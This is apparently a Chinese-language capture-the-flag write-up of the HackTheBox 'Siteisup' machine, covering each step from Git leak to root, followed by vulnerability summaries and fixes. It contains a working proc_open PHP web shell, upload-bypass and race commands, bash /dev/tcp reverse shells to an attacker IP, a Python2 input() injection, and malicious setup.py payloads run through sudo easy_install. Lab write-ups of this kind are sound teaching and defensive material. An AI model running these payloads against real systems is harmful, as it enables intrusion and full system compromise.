# Siteisup 靶机完整攻击链总结

## 1. 入口与特殊 Header

目标子域名：

```bash
dev.siteisup.htb
```

默认访问返回 `403 Forbidden`：

```bash
curl --noproxy '*' -i http://dev.siteisup.htb/
```

通过信息泄露发现该子域名需要特殊 Header：

```http
Special-Dev: only4dev
```

带上 Header 后可以访问 `dev` 子域名的 beta 上传功能：

```bash
curl --noproxy '*' -i \
  -H 'Special-Dev: only4dev' \
  http://dev.siteisup.htb/
```

---

## 2. Header 来源：Git 泄露

特殊 Header 的来源是 Git 信息泄露。

尝试访问 `.git` 目录：

```bash
curl --noproxy '*' http://siteisup.htb/dev/.git/HEAD
curl --noproxy '*' http://siteisup.htb/dev/.git/index -o index
```

其中 `.git/index` 成功泄露，能够恢复出部分项目文件名：

```text
.htaccess
admin.php
changelog.txt
checker.php
index.php
stylesheet.css
```

其中 `.htaccess` 是判断 `dev` 特殊 Header 的关键文件。

当前可恢复的内容主要来自：

```text
.git/index
.git/config
refs/logs
```

但是 `objects/blob` 当前返回 `404`，所以无法完整恢复 `.htaccess` 原文。

---

## 3. 上传点分析

`dev` 页面存在文件上传功能。

上传限制如下：

```text
.php / .phtml 被拦截
.phar 被允许
.phar 会被 Apache/PHP 执行
```

同时发现常见 PHP 命令执行函数被禁用：

```text
system
exec
shell_exec
popen
passthru
```

但是 `proc_open` 可用，因此可以使用基于 `proc_open` 的 PHP web shell。

---

## 4. Web Shell Payload

使用 `.phar` 后缀绕过上传限制。

Payload 内容：

```php
<?php
echo "CMD_START\n";
$cmd = $_GET["cmd"] ?? "id";
$d = [1 => ["pipe","w"], 2 => ["pipe","w"]];
$p = proc_open($cmd, $d, $pipes);
if (is_resource($p)) {
  echo stream_get_contents($pipes[1]);
  echo stream_get_contents($pipes[2]);
  proc_close($p);
}
echo "CMD_END\n";
?>
```

---

## 5. 上传目录易被清理

上传目录会很快被清理，因此需要使用慢连接拖住检查流程。

端口分工：

```text
8088  -> 慢连接端口，用于保留 uploads 临时目录
4444  -> reverse shell 监听端口
```

本机监听慢连接：

```bash
nc -lvnp 8088
```

构造一个慢 URL 文件：

```bash
for i in $(seq 1 80); do
  printf 'http://10.10.16.51:8088/%s\n' "$i" >> /tmp/cmd.phar
done
```

上传 `.phar` 文件：

```bash
curl --noproxy '*' -sS --max-time 90 \
  -H 'Special-Dev: only4dev' \
  -F 'file=@/tmp/cmd.phar;type=application/octet-stream' \
  -F 'check=Check' \
  http://dev.siteisup.htb/ >/tmp/cmd_upload.out &
```

查找上传目录：

```bash
d=$(curl --noproxy '*' -sS --max-time 8 \
  -H 'Special-Dev: only4dev' \
  http://dev.siteisup.htb/uploads/ | \
  grep -oE '[a-f0-9]{32}/' | tail -1 | tr -d /)
```

测试 web shell：

```bash
curl --noproxy '*' -sS \
  -H 'Special-Dev: only4dev' \
  -G --data-urlencode 'cmd=id' \
  "http://dev.siteisup.htb/uploads/$d/cmd.phar"
```

成功时返回：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 6. 获取 www-data Shell

注意反连地址要使用 HTB VPN 地址：

```text
tun0 = 10.10.16.51
```

不要使用普通网卡地址：

```text
eth0 = 10.0.2.15
```

本机监听：

```bash
nc -lvnp 4444
```

触发反连：

```bash
curl --noproxy '*' -sS \
  -H 'Special-Dev: only4dev' \
  -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.51/4444 0>&1'" \
  "http://dev.siteisup.htb/uploads/$d/cmd.phar"
```

成功后获得：

```text
www-data shell
```

---

## 7. SUID 提权到 developer

拿到 `www-data` 可交互 shell 后，目标上的关键文件为：

```text
/home/developer/dev/siteisup
/home/developer/dev/siteisup_test.py
```

SUID 程序权限：

```text
-rwsr-x--- 1 developer www-data ... /home/developer/dev/siteisup
```

该 SUID 程序会调用：

```bash
/usr/bin/python /home/developer/dev/siteisup_test.py
```

脚本中使用了 Python2 的 `input()`：

```python
url = input("Enter URL here:")
```

Python2 中的 `input()` 会把输入内容当作 Python 表达式执行。

由于外层 ELF 文件具有 SUID 权限，并且属主是 `developer`，所以表达式里的命令会以 `developer` 身份运行。

---

## 8. 验证 developer 提权

验证命令：

```bash
printf '__import__("os").system("id")\n' | /home/developer/dev/siteisup 2>&1
```

返回中关键内容：

```text
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

这说明已经从：

```text
www-data -> developer
```

完成提权。

后面出现的报错：

```text
requests.exceptions.MissingSchema: Invalid URL '0'
```

属于正常副作用。

原因是：

```text
os.system("id") 返回 0
脚本继续把 0 当作 URL 传给 requests
所以出现 Invalid URL '0'
```

该报错不影响命令已经以 `developer` 身份执行的结论。

---

## 9. 读取 user flag

读取 user flag：

```bash
printf '__import__("os").system("cat /home/developer/user.txt")\n' | /home/developer/dev/siteisup 2>&1
```

---

## 10. 尝试拿 developer shell

尝试拿交互 shell：

```bash
printf '__import__("os").system("/bin/bash -p")\n' | /home/developer/dev/siteisup
```

或者反连 developer shell。

本机监听：

```bash
nc -lvnp 5555
```

目标触发：

```bash
printf '__import__("os").system("bash -p -c '\''bash -i >& /dev/tcp/10.10.16.51/5555 0>&1'\''")\n' | /home/developer/dev/siteisup 2>&1
```

---

## 11. Root 提权点

Root 提权点来自 `developer` 用户的 `sudo` 配置。

执行：

```bash
sudo -l
```

可以看到：

```text
User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

含义是：

```text
developer 用户可以免密码以 root 权限执行 /usr/local/bin/easy_install
```

关键点：

```text
(ALL) NOPASSWD: /usr/local/bin/easy_install
```

说明 `developer` 可以直接通过 `sudo` 运行 `easy_install`，且不需要输入密码。

---

## 12. Root 提权利用思路

`easy_install` 在安装 Python 包时，会执行目标目录中的 `setup.py`。

如果我们可以控制一个目录，并在该目录中放入恶意 `setup.py`，再让 `easy_install` 安装这个目录，那么 `setup.py` 中的命令就会被执行。

由于执行命令是：

```bash
sudo /usr/local/bin/easy_install <目录>
```

所以 `setup.py` 会以 `root` 权限运行。

核心逻辑：

```text
developer 可 sudo 执行 easy_install
  ↓
easy_install 会执行安装目录中的 setup.py
  ↓
攻击者控制 setup.py 内容
  ↓
setup.py 通过 sudo 被 root 执行
  ↓
获得 root 权限
```

---

## 13. 验证 root 命令执行

先创建一个临时目录：

```bash
TF=$(mktemp -d)
```

写入测试用的 `setup.py`：

```bash
cat > "$TF/setup.py" << 'EOF'
import os
os.system("id > /tmp/root_id_test")
EOF
```

使用 sudo 执行 `easy_install`：

```bash
sudo /usr/local/bin/easy_install "$TF"
```

查看执行结果：

```bash
cat /tmp/root_id_test
```

成功时可以看到：

```text
uid=0(root) gid=0(root) groups=0(root)
```

这说明 `setup.py` 已经以 `root` 权限执行。

---

## 14. 读取 root flag

创建临时目录：

```bash
TF=$(mktemp -d)
```

写入读取 root flag 的 `setup.py`：

```bash
cat > "$TF/setup.py" << 'EOF'
import os
os.system("cat /root/root.txt > /tmp/root_flag")
os.system("chmod 644 /tmp/root_flag")
EOF
```

执行：

```bash
sudo /usr/local/bin/easy_install "$TF"
```

读取 flag：

```bash
cat /tmp/root_flag
```

成功后即可读取：

```text
/root/root.txt
```

---

## 15. 获取 root shell

本机先监听端口：

```bash
nc -lvnp 6666
```

目标机器上创建临时目录：

```bash
TF=$(mktemp -d)
```

写入反连 shell 的 `setup.py`：

```bash
cat > "$TF/setup.py" << 'EOF'
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.51/6666 0>&1'")
EOF
```

执行：

```bash
sudo /usr/local/bin/easy_install "$TF"
```

注意：

```text
10.10.16.51 需要替换成自己的 HTB VPN tun0 IP
6666 是本机监听端口
```

成功后可以获得 root shell。

---

## 16. 另一种 root shell 方法

也可以尝试在 `setup.py` 中直接执行：

```python
os.execl("/bin/sh", "sh", "-p")
```

但是这种方式可能会出现“看起来卡住”的情况。

原因是：

```text
它启动的是交互 shell
当前反连环境的 TTY 不一定正常
所以界面可能没有明显回显
```

更稳妥的做法是：

```text
先用 id > /tmp/root_id_test 验证 root 执行
再读取 root flag
最后再尝试反连 root shell
```

---

## 17. 完整核心攻击链

完整攻击链如下：

```text
Git index 泄露
  ↓
发现 dev 子域名需要特殊 Header
  ↓
Special-Dev: only4dev 打开 dev 上传功能
  ↓
发现 .phar 可以上传并被 PHP 执行
  ↓
使用 proc_open 绕过禁用函数限制
  ↓
上传 .phar web shell
  ↓
通过慢连接保留 uploads 临时目录
  ↓
命令执行成功
  ↓
获得 www-data shell
  ↓
发现 /home/developer/dev/siteisup SUID 程序
  ↓
SUID 程序调用 Python2 脚本
  ↓
Python2 input() 表达式执行
  ↓
命令以 developer 身份执行
  ↓
www-data 提权到 developer
  ↓
执行 sudo -l
  ↓
发现 developer 可免密执行 /usr/local/bin/easy_install
  ↓
创建攻击者可控临时目录
  ↓
写入恶意 setup.py
  ↓
sudo easy_install 执行该目录
  ↓
easy_install 触发 setup.py
  ↓
setup.py 以 root 权限执行命令
  ↓
developer 提权到 root
```

---

## 18. 漏洞点总结

### 18.1 Git 信息泄露

暴露路径：

```text
/dev/.git/index
```

影响：

```text
泄露项目结构
泄露隐藏文件名
辅助发现 .htaccess
辅助推断特殊 Header
```

---

### 18.2 隐藏 Header 访问控制不安全

访问控制依赖：

```http
Special-Dev: only4dev
```

问题：

```text
Header 名和值可以通过源码或 Git 泄露获得
不能作为真正的安全边界
```

---

### 18.3 上传过滤不完整

拦截了：

```text
.php
.phtml
```

但是允许：

```text
.phar
```

问题：

```text
.phar 仍然可能被 Apache/PHP 解析执行
导致上传 Web Shell
```

---

### 18.4 PHP 函数禁用不完整

禁用了：

```text
system
exec
shell_exec
popen
passthru
```

但是遗漏了：

```text
proc_open
```

影响：

```text
攻击者仍然可以通过 proc_open 执行系统命令
```

---

### 18.5 上传目录临时清理可被绕过

上传目录会被快速清理。

但是可以通过慢连接拖住检查流程，使临时目录短时间保留，从而访问上传后的 `.phar` 文件。

---

### 18.6 SUID 程序调用不安全脚本

SUID 程序：

```text
/home/developer/dev/siteisup
```

属主：

```text
developer
```

可执行组：

```text
www-data
```

问题：

```text
www-data 可以执行该 SUID 程序
SUID 程序调用 Python 脚本
Python 脚本存在危险 input()
最终导致命令以 developer 权限执行
```

---

### 18.7 Python2 input() 代码执行

危险代码：

```python
url = input("Enter URL here:")
```

Python2 中：

```text
input() 会执行输入内容
raw_input() 才是普通字符串输入
```

因此输入：

```python
__import__("os").system("id")
```

会直接执行系统命令。

---

### 18.8 sudo 配置不当

危险 sudo 配置：

```text
(ALL) NOPASSWD: /usr/local/bin/easy_install
```

问题：

```text
developer 可以免密码以 root 身份执行 easy_install
easy_install 会执行用户控制目录中的 setup.py
setup.py 可以执行任意系统命令
最终导致 developer -> root
```

---

## 19. 风险总结

整体风险点包括：

```text
开发环境暴露
Git 信息泄露
隐藏 Header 作为访问控制
上传过滤不完整
上传目录可执行 PHP
PHP disable_functions 配置不完整
临时上传目录清理机制可被竞争利用
SUID 程序设计不当
Python2 input() 危险函数误用
sudo NOPASSWD 配置不当
easy_install 可被滥用执行 setup.py
```

最终影响：

```text
攻击者可以从 Web 入口获得 www-data
攻击者可以从 www-data 提权到 developer
攻击者可以读取 user flag
攻击者可以从 developer 提权到 root
攻击者可以读取 root flag
攻击者可以执行任意 root 命令
攻击者可以获得 root shell
```

---

## 20. 修复建议

### 20.1 禁止暴露 Git 目录

应该禁止访问：

```text
.git
.git/index
.git/config
.git/HEAD
.git/objects
.git/logs
```

Nginx / Apache 中应明确拒绝 `.git` 目录访问。

---

### 20.2 不要依赖隐藏 Header 做访问控制

隐藏 Header 只能作为调试辅助手段，不能作为安全认证机制。

应使用：

```text
登录认证
权限校验
IP allowlist
VPN
服务端 session
```

---

### 20.3 加强上传校验

上传文件应做到：

```text
白名单后缀
检查 MIME
检查文件内容
上传目录禁止执行脚本
随机文件名
文件存储到 Web 根目录之外
```

尤其应禁止执行：

```text
.php
.phtml
.phar
```

---

### 20.4 上传目录禁止 PHP 执行

上传目录应配置为静态文件目录。

例如禁止 PHP 解析：

```text
uploads/
```

不要让上传目录中的文件被解释器执行。

---

### 20.5 不要只依赖 disable_functions

禁用危险函数不是完整防护。

除了禁用：

```text
system
exec
shell_exec
popen
passthru
proc_open
pcntl_exec
```

更重要的是：

```text
避免用户可控内容进入命令执行逻辑
隔离运行权限
限制 Web 用户权限
使用容器或沙箱
```

---

### 20.6 避免 SUID 程序调用脚本语言解释器

SUID 程序不应直接调用：

```text
python
bash
sh
perl
php
```

尤其不能调用用户可影响输入的脚本。

---

### 20.7 Python2 中避免 input()

Python2 中应使用：

```python
raw_input()
```

不要使用：

```python
input()
```

如果必须处理 URL，应进行严格校验：

```text
只允许 http/https
限制目标 host
禁止本地地址
禁止命令表达式
```

---

### 20.8 不要给 easy_install 配置 sudo 权限

应移除类似配置：

```text
developer ALL=(ALL) NOPASSWD: /usr/local/bin/easy_install
```

尤其不要给低权限用户配置：

```text
NOPASSWD
```

并且不要允许低权限用户通过 sudo 执行包管理、解释器、构建工具等程序。

---

### 20.9 避免危险 sudo 程序

不应直接允许 sudo 执行：

```text
easy_install
pip
python
perl
ruby
bash
sh
vim
less
find
tar
cp
rsync
```

这类程序通常可以被滥用来执行命令或写入敏感文件。

---

### 20.10 使用最小权限原则

如果确实需要让用户安装依赖，应使用更安全的方式：

```text
限制固定参数
限制固定目录
使用虚拟环境
使用专门的部署脚本
避免 root 权限执行用户可控内容
```

---

### 20.11 审计 sudoers 配置

应定期检查：

```bash
sudo -l
```

以及：

```text
/etc/sudoers
/etc/sudoers.d/*
```

重点关注：

```text
NOPASSWD
ALL
可执行解释器
可执行包管理器
可写目录中的脚本
```

---

## 21. 最终结论

本靶机的完整攻击链是多个问题串联形成的权限提升链：

```text
Git 泄露
+ Header 访问控制缺陷
+ 上传过滤绕过
+ PHP proc_open 命令执行
+ 临时目录竞争利用
+ SUID 程序错误设计
+ Python2 input() 表达式执行
+ sudo easy_install 滥用
= 从 Web 入口一路提权到 root
```

最终权限路径为：

```text
外部访问者
  ↓
www-data
  ↓
developer
  ↓
root
```

核心问题不是单点漏洞，而是：

```text
开发环境暴露
源码泄露
上传目录可执行
SUID 程序设计不当
脚本语言危险函数误用
sudo 权限配置不当
```